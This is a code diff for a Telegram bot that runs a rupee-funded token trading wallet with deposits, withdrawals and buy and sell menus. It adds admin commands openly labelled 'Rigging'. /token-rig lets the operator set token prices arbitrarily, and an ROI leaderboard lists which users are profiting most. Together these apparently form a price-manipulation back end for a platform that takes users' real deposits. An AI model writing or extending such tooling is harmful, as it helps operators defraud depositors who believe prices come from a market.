@@ -1,9 +1,11 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ContextTypes, ConversationHandler
 from database import (
     get_user_wallet, get_all_tokens, update_wallet_balance, 
     trade_token, create_transaction, get_user_transactions, 
-    update_transaction_status, get_transaction, get_user_data
+    update_transaction_status, get_transaction, get_user_data,
+    update_token_price, users_collection, get_all_user_ids,
+    update_token_holding
 )
 from config import ADMIN_ID, PAYMENT_IMAGE_URL
 
@@ -13,7 +15,9 @@ DEP_AMOUNT, DEP_METHOD, DEP_UTR = range(10, 13)
 # Withdraw
 WD_AMOUNT, WD_METHOD, WD_DETAILS = range(20, 23)
 
-# --- 1. MAIN WALLET MENU ---
+# ==========================================
+# 1. MAIN WALLET MENU
+# ==========================================
 async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     wallet = get_user_wallet(uid)
@@ -253,7 +257,7 @@ async def process_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return ConversationHandler.END
 
 # ==========================================
-# 👮 ADMIN HANDLER
+# 👮 ADMIN PAYMENT HANDLER
 # ==========================================
 
 async def admin_payment_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -348,3 +352,74 @@ async def sell_token_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         trade_token(uid, sym, 1, t['price'], is_buy=False)
         await q.answer(f"✅ Sold 1 {sym}!", show_alert=True)
         await sell_menu(update, context)
+
+# ==========================================
+# 🛠️ ADMIN TOKEN CMDS (Rigging & ROI)
+# ==========================================
+
+async def token_rig_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Usage: /token-rig SYMBOL NEW_PRICE
+    """
+    if update.effective_user.id != ADMIN_ID: return
+    
+    try:
+        sym = context.args[0].upper()
+        price = float(context.args[1])
+        update_token_price(sym, price)
+        await update.message.reply_text(f"✅ **Rigged:** {sym} set to ₹{price}")
+    except:
+        await update.message.reply_text("❌ Usage: `/token-rig SYMBOL PRICE`")
+
+async def token_roi_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Shows users with best ROI.
+    """
+    if update.effective_user.id != ADMIN_ID: return
+    
+    await update.message.reply_text("⏳ **Calculating ROI List...**")
+    
+    tokens = get_all_tokens()
+    price_map = {t['symbol']: t['price'] for t in tokens}
+    
+    roi_data = []
+    
+    # Check if we can access the collection directly or need to iterate
+    # Using raw pymongo iteration for speed on this specific admin command
+    all_users = users_collection.find()
+    
+    for u in all_users:
+        wallet = u.get('wallet', {})
+        holdings = wallet.get('holdings', {})
+        invested = wallet.get('invested_amt', {})
+        
+        total_current_val = 0
+        total_invested_val = 0
+        
+        for sym, qty in holdings.items():
+            if qty > 0:
+                # Current Value
+                curr_p = price_map.get(sym, 0)
+                total_current_val += qty * curr_p
+                
+                # Invested Value
+                total_invested_val += invested.get(sym, 0)
+                
+        if total_invested_val > 0:
+            roi_pct = ((total_current_val - total_invested_val) / total_invested_val) * 100
+            roi_data.append({
+                "uid": u['user_id'],
+                "roi": roi_pct,
+                "profit": total_current_val - total_invested_val
+            })
+            
+    # Sort by ROI Descending
+    roi_data.sort(key=lambda x: x['roi'], reverse=True)
+    
+    msg = "🏆 **TOKEN ROI LEADERBOARD**\n━━━━━━━━━━━━━━\n"
+    for i, d in enumerate(roi_data[:10]): # Top 10
+        msg += f"{i+1}. User `{d['uid']}`: **{d['roi']:.1f}%** (Profit: ₹{int(d['profit'])})\n"
+        
+    if not roi_data: msg += "No investments found."
+    
+    await update.message.reply_text(msg, parse_mode="Markdown")
